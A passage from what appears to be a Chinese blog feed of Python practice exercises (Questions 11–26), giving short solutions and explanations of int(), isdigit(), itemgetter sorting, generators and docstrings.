<p>语法：<code>class int(x, base=10)</code></p>
<ul>
<li>x 为字符串或数字</li>
<li>base 表示 x 的进制</li>
</ul>
<p>返回值：一个整形数据</p>
<p>就以本题为例，输入 0100,0011,1010,1001 可以使用下面的代码变为 10
进制：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">binary_num = [<span class="string">&#x27;0100&#x27;</span>,<span class="string">&#x27;0011&#x27;</span>,<span class="string">&#x27;1010&#x27;</span>,<span class="string">&#x27;1001&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> binary_num <span class="keyword">in</span> binary_num:</span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">int</span>(binary_num, <span class="number">2</span>))</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220702104805.png" /></p>
<h1 id="question-12">2. Question 12</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>判断 [2000, 3000]
范围内，每一位都是偶数的数字，将所有满足条件的数字输出，以逗号作为分隔。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="built_in">list</span>()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>, <span class="number">3001</span>):</span><br><span class="line">    num = <span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">int</span>(num[<span class="number">0</span>])%<span class="number">2</span>==<span class="number">0</span>) <span class="keyword">and</span> (<span class="built_in">int</span>(num[<span class="number">1</span>])%<span class="number">2</span>==<span class="number">0</span>) <span class="keyword">and</span> (<span class="built_in">int</span>(num[<span class="number">2</span>])%<span class="number">2</span>==<span class="number">0</span>) <span class="keyword">and</span> (<span class="built_in">int</span>(num[<span class="number">3</span>])%<span class="number">2</span>==<span class="number">0</span>):</span><br><span class="line">        res.append(num)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<h1 id="question-13">3. Question 13</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li><p>输入一串字符串，求字符串中字母和数字的个数，并将其输出。</p></li>
<li><p>输入：hello world! 123</p></li>
<li><p>输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LETTERS 10</span><br><span class="line">DIGITS 3</span><br></pre></td></tr></table></figure></li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = <span class="number">0</span></span><br><span class="line">letters = <span class="number">0</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> &lt;= s &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">        nums += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> (<span class="string">&#x27;a&#x27;</span> &lt;= s &lt;= <span class="string">&#x27;z&#x27;</span>) <span class="keyword">or</span> (<span class="string">&#x27;A&#x27;</span> &lt;= s &lt;= <span class="string">&#x27;Z&#x27;</span>):</span><br><span class="line">        letters += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;LETTERS <span class="subst">&#123;letters&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;DIGITS <span class="subst">&#123;nums&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>或者更直接点：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = <span class="number">0</span></span><br><span class="line">letters = <span class="number">0</span></span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> s.isdigit():</span><br><span class="line">        nums += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> s.isalpha():</span><br><span class="line">        letters += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;LETTERS <span class="subst">&#123;letters&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;DIGITS <span class="subst">&#123;nums&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="isdigit-方法">3.1. isdigit() 方法</h2>
<p>作用：判断字符串是否只有数字组成，只对 0 和 正数有效。</p>
<p>语法：<code>str.isdigit()</code></p>
<p>返回值：bool 值</p>
<h2 id="isalpha-方法">3.2. isalpha() 方法</h2>
<p>作用：判断字符串是否只有字母组成</p>
<p>语法：<code>str.isalpha()</code></p>
<p>返回值：bool 值</p>
<h1 id="question-14">4. Question 14</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>判断输入的字符串中的大写和小写字母的个数，并输出</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = &#123;<span class="string">&#x27;UPPER CASE&#x27;</span>: <span class="number">0</span>, <span class="string">&#x27;LOWER CASE&#x27;</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> s.isupper():</span><br><span class="line">        res[<span class="string">&#x27;UPPER CASE&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> s.islower():</span><br><span class="line">        res[<span class="string">&#x27;LOWER CASE&#x27;</span>] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;UPPER CASE <span class="subst">&#123;res[<span class="string">&quot;UPPER CASE&quot;</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;LOWER CASE <span class="subst">&#123;res[<span class="string">&quot;LOWER CASE&quot;</span>]&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="isupper-方法">4.1. isupper() 方法</h2>
<p>作用：判断字符串是否只有大写字母组成</p>
<p>语法：<code>str.isupper()</code></p>
<p>返回值：bool 值</p>
<h2 id="islower-方法">4.2. islower() 方法</h2>
<p>作用：判断字符串是否只有小写字母组成</p>
<p>语法：<code>str.islower()</code></p>
<p>返回值：bool 值</p>
<h1 id="question-15">5. Question 15</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给定一个数字 a，计算 <code>a+aa+aaa+aaaa</code> 的值</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">res = <span class="number">0</span></span><br><span class="line">add_num = num</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    res += add_num</span><br><span class="line">    add_num = add_num * <span class="number">10</span> + num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p>或者：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="built_in">input</span>()</span><br><span class="line">n1 = <span class="built_in">int</span>( <span class="string">&quot;%s&quot;</span> % a )</span><br><span class="line">n2 = <span class="built_in">int</span>( <span class="string">&quot;%s%s&quot;</span> % (a,a) )</span><br><span class="line">n3 = <span class="built_in">int</span>( <span class="string">&quot;%s%s%s&quot;</span> % (a,a,a) )</span><br><span class="line">n4 = <span class="built_in">int</span>( <span class="string">&quot;%s%s%s%s&quot;</span> % (a,a,a,a) )</span><br><span class="line"><span class="built_in">print</span>(n1+n2+n3+n4)</span><br></pre></td></tr></table></figure>
<h1 id="question-16">6. Question 16</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>给一串逗号分隔的数字串，找出其中的奇数并以逗号分为输出</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">nums = [num <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>) <span class="keyword">if</span> <span class="built_in">int</span>(num)%<span class="number">2</span>!=<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(nums))</span><br></pre></td></tr></table></figure>
<h1 id="question-17">7. Question 17</h1>
<p><strong>题目</strong>：（medium）</p>
<ul>
<li>根据输入的记录来计算收入。输入为：<code>D/W value</code> D 表示
收入，W 表示支出，value 表示值。将最后的结果输出</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = <span class="built_in">input</span>().split()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> s[<span class="number">0</span>] == <span class="string">&#x27;D&#x27;</span>:</span><br><span class="line">        res += <span class="built_in">int</span>(s[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">elif</span> s[<span class="number">0</span>] == <span class="string">&#x27;W&#x27;</span>:</span><br><span class="line">        res -= <span class="built_in">int</span>(s[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<h1 id="question-18">8. Question 18</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定多个密码串（用逗号分隔），判断密码是否符合规定，符合的输出，也以逗号为分隔</li>
<li>规定：至少包含一个 <code>#&amp;@</code>
其中一个；至少包含一个数字，至少包含一个小写字母，至少包含一个大写字母；</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isValidity</span>(<span class="params">pwd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(pwd) &lt; <span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(pwd) &gt; <span class="number">12</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> (<span class="string">&#x27;#&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> pwd) <span class="keyword">and</span>  (<span class="string">&#x27;$&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> pwd) <span class="keyword">and</span> (<span class="string">&#x27;@&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> pwd):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">bool</span>(re.search(<span class="string">&#x27;\d&#x27;</span>, pwd)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">bool</span>(re.search(<span class="string">&#x27;[a-z]&#x27;</span>, pwd)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> <span class="built_in">bool</span>(re.search(<span class="string">&#x27;[A-Z]&#x27;</span>, pwd)):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line">passwds = <span class="built_in">input</span>().split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> passwd <span class="keyword">in</span> passwds:</span><br><span class="line">    <span class="keyword">if</span> isValidity(passwd):</span><br><span class="line">        res.append(passwd)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;,&#x27;</span>.join(res))</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>正则表达式</li>
</ul>
<h1 id="question-19">9. Question 19</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>输入多组数据，每组数据为 name,age,height
中间用逗号分隔。要求将每组数据变为元组，然后进行升序排序。先按
name，如果一样再按照 age，如果还一样最后按照 height。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">tuples = []</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    s = <span class="built_in">input</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> s:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    tuples.append(<span class="built_in">tuple</span>(s.split(<span class="string">&#x27;,&#x27;</span>)))</span><br><span class="line">tuples.sort(key=itemgetter(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(tuples)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>itemgetter() 函数的使用</li>
</ul>
<h2 id="itemgetter">9.1. itemgetter()</h2>
<p>该函数的作用主要是获取某一对象
<strong>特定维度的数据</strong>，其参数为维度的序号。</p>
<p>需要注意，该函数的返回值也是一个函数。我们举个例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>, <span class="number">5</span>, <span class="number">6</span>]</span><br><span class="line">b = itemgetter(<span class="number">1</span>)</span><br><span class="line">c = itemgetter(<span class="number">1</span>,<span class="number">4</span>,<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(b(a))</span><br><span class="line"><span class="built_in">print</span>(c(a))</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220702122036.png" /></p>
<p>看其利用方式就知道返回值是一个函数。该函数的作用是
<strong>依次提取</strong> 某一对象的特定维度的数据。</p>
<p>因此，可以用来针对某一个非数值性的对象序列进行排序。比如我们这道题，要求先排
name，然后排 age，最后排 height，就可以使用
<code>sorted(key=itemgetter(0,1,2))</code> 来依次提取出 name 排序，age
排序，height 排序。</p>
<h1 id="question-20">10. Question 20</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>定义一个类为生成器，用来迭代输出可以被 7 整除的数字，范围为 0 到
n。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Xrange</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, num</span>):</span></span><br><span class="line">        self.max_num = num</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span>(<span class="params">self</span>):</span></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> i &lt; self.max_num:</span><br><span class="line">            <span class="keyword">if</span> i%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">                <span class="keyword">yield</span> i</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> Xrange(<span class="number">100</span>):</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
<p>上面是类的写法，也可以使用函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">putNumbers</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> i%<span class="number">7</span>==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">yield</span> i</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p = putNumbers(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> p:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python 练习</tag>
      </tags>
  </entry>
  <entry>
    <title>Question 21-30</title>
    <url>/2022/07/03/Question%2021-30/</url>
    <content><![CDATA[<p>项目地址：<a
href="https://github.com/ReganQing/Python-programming-exercises/blob/master/100%2B%20Python%20challenging%20programming%20exercises%20for%20Python%203.md">Python-programming-exercises/100+
Python challenging programming exercises for Python 3.md at master ·
ReganQing/Python-programming-exercises · GitHub</a></p>
<p>分为三个等级：</p>
<ol type="1">
<li>easy</li>
<li>medium</li>
<li>hard</li>
</ol>
<span id="more"></span>
<h1 id="question-21">1. Question 21</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>有一个机器人初始位置为 (0, 0)，只会上下左右移动。比如输入为：UP 5
DOWN 3 LEFT 3 RIGHT 2，意思为：先先向上移动 5 个单位，然后向下移动 3
个单位，接着向左移动 3 个单位，最后向右移动 2
个单位。计算出机器人最后的位置和初始位置的距离，如果是 float
则四舍五入。</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line">local = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    movement = <span class="built_in">input</span>().split()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> movement:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    direction = movement[<span class="number">0</span>]</span><br><span class="line">    step = <span class="built_in">int</span>(movement[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> direction == <span class="string">&#x27;UP&#x27;</span>:</span><br><span class="line">        local[<span class="number">1</span>] += step</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;DOWN&#x27;</span>:</span><br><span class="line">        local[<span class="number">1</span>] -= step</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;LEFT&#x27;</span>:</span><br><span class="line">        local[<span class="number">0</span>] -= step</span><br><span class="line">    <span class="keyword">elif</span> direction == <span class="string">&#x27;RIGHT&#x27;</span>:</span><br><span class="line">        local[<span class="number">0</span>] += step</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="built_in">round</span>(math.sqrt(<span class="built_in">pow</span>(local[<span class="number">0</span>], <span class="number">2</span>) + <span class="built_in">pow</span>(local[<span class="number">1</span>], <span class="number">2</span>)))))</span><br></pre></td></tr></table></figure>
<h1 id="question-22">2. Question 22</h1>
<p><strong>题目</strong>：（hard）</p>
<ul>
<li>给定一串字符串，求出字符串中每个单词出现的次数，并按照单词进行字母表排序，然后输出。比如输入为：New
to Python or choosing between Python 2 and Python 3? Read Python 2 or
Python 3. 输出为：2:2 3.:1 3?:1 New:1 Python:5 Read:1 and:1 between:1
choosing:1 or:2 to:1</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">str</span> = <span class="built_in">input</span>().split()</span><br><span class="line">res = <span class="built_in">dict</span>()</span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">if</span> word <span class="keyword">in</span> res:</span><br><span class="line">        res[word] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res[word] = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> word <span class="keyword">in</span> <span class="built_in">sorted</span>(res.keys()):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;word&#125;</span>:<span class="subst">&#123;res[word]&#125;</span>&#x27;</span>, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>注意</strong>：</p>
<ul>
<li>本题考查的是关于字典的排序。</li>
</ul>
<h2 id="字典排序">2.1. 字典排序</h2>
<p>首先介绍一下 sorted 函数。语法如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sorted</span>(iterable, key, reverse)</span><br></pre></td></tr></table></figure>
<ul>
<li>iterable：可迭代对象；</li>
<li>key：是一个函数，用来选取参与比较的函数；</li>
<li>reverse：指定升序还是降序，True 为降序，False 为升序（默认）；</li>
</ul>
<p>对字典的排序可以分为 2 种：</p>
<ol type="1">
<li>对 key 排序</li>
<li>对 value 排序</li>
</ol>
<h3 id="key">2.1.1. key</h3>
<p>第一种办法：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sorted</span>(my_dict.keys()))</span><br><span class="line"><span class="built_in">print</span>(my_dict)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [&#x27;age&#x27;, &#x27;lilee&#x27;, &#x27;phone&#x27;]</span></span><br><span class="line"><span class="comment"># &#123;&#x27;lilee&#x27;: 25, &#x27;age&#x27;: 24, &#x27;phone&#x27;: 12&#125;</span></span><br></pre></td></tr></table></figure>
<p>直接对 dict.keys()
进行排序即可。需要注意的是，这种方法得到的返回值是一个对 keys
排序过后的列表，原来的字典没有变化。</p>
<p>如果需要遍历排序之后的结果，可以这样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line"><span class="keyword">for</span> key <span class="keyword">in</span> <span class="built_in">sorted</span>(my_dict.keys()):</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;key&#125;</span> : <span class="subst">&#123;my_dict[key]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># age : 24</span></span><br><span class="line"><span class="comment"># lilee : 25</span></span><br><span class="line"><span class="comment"># phone : 12</span></span><br></pre></td></tr></table></figure>
<p>第二种方法，使用 lambda 匿名函数：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line">d = <span class="built_in">sorted</span>(my_dict.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># [(&#x27;age&#x27;, 24), (&#x27;lilee&#x27;, 25), (&#x27;phone&#x27;, 12)]</span></span><br></pre></td></tr></table></figure>
<p>这种方法改变了整个字典的顺序。</p>
<p>也可以使用 operator.itemgetter 来，效果与 lambda 函数一样：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line">d = <span class="built_in">sorted</span>(my_dict.items(), key=itemgetter(<span class="number">0</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># [(&#x27;age&#x27;, 24), (&#x27;lilee&#x27;, 25), (&#x27;phone&#x27;, 12)]</span></span><br></pre></td></tr></table></figure>
<h3 id="value">2.1.2. value</h3>
<p>只知道 value 是无法找到字典中的元素的，因此单纯的对 value
排序而不改变字典顺序是没有意义的，所以对 value
排序一定会改变字典顺序。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line">d = <span class="built_in">sorted</span>(my_dict.items(), key=<span class="keyword">lambda</span> item: item[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># [(&#x27;phone&#x27;, 12), (&#x27;age&#x27;, 24), (&#x27;lilee&#x27;, 25)]</span></span><br></pre></td></tr></table></figure>
<p>还可以使用 operator.itemgetter 进行排序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> itemgetter</span><br><span class="line">my_dict = &#123;<span class="string">&#x27;lilee&#x27;</span>:<span class="number">25</span>, <span class="string">&#x27;age&#x27;</span>:<span class="number">24</span>, <span class="string">&#x27;phone&#x27;</span>:<span class="number">12</span>&#125;</span><br><span class="line">d = <span class="built_in">sorted</span>(my_dict.items(), key=itemgetter(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(d)</span><br><span class="line"><span class="comment"># [(&#x27;phone&#x27;, 12), (&#x27;age&#x27;, 24), (&#x27;lilee&#x27;, 25)]</span></span><br></pre></td></tr></table></figure>
<h1 id="question-23">3. Question 23</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>实现求平方的函数</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span>(<span class="params">x</span>):</span>  </span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(square(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<h1 id="question-24">4. Question 24</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>打印 Python 内置函数的文档，比如 abs(), int(),
input()。以及为上一题中的自定义函数写文档</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    :param x:</span></span><br><span class="line"><span class="string">    :return: x**2</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> x**<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>.__doc__)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>.__doc__)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">input</span>.__doc__)</span><br><span class="line"><span class="built_in">print</span>(square.__doc__)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220703223620.png" /></p>
<h2 id="函数内置文档">4.1. 函数内置文档</h2>
<p>一个函数定义中，<strong>最开始的多行注释</strong>
为这个函数的内置文档，可以通过 <code>func.__doc__</code> 进行查看。</p>
<h1 id="question-25">5. Question 25</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个
class，拥有一个属性(name)以及一个相同的实例参数(self.name)</li>
</ul>
<p><strong>代码</strong>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span>:</span></span><br><span class="line">    name = <span class="string">&#x27;person&#x27;</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name=<span class="literal">None</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">m1ku = Person(<span class="string">&#x27;m1ku&#x27;</span>)</span><br><span class="line">jack = Person()</span><br><span class="line"><span class="built_in">print</span>(m1ku.name, Person.name)</span><br><span class="line"><span class="built_in">print</span>(jack.name, Person.name)</span><br></pre></td></tr></table></figure>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220703224222.png" /></p>
<p>可以看到，属性的参数 name 不会被修改，而实例参数 self.name
会被修改。</p>
<h1 id="question-26">6. Question 26</h1>
<p><strong>题目</strong>：（easy）</p>
<ul>
<li>定义一个函数，功能为求两数之和，并返回结果。</li>
</ul>
<p><strong>代码</strong>：</p>
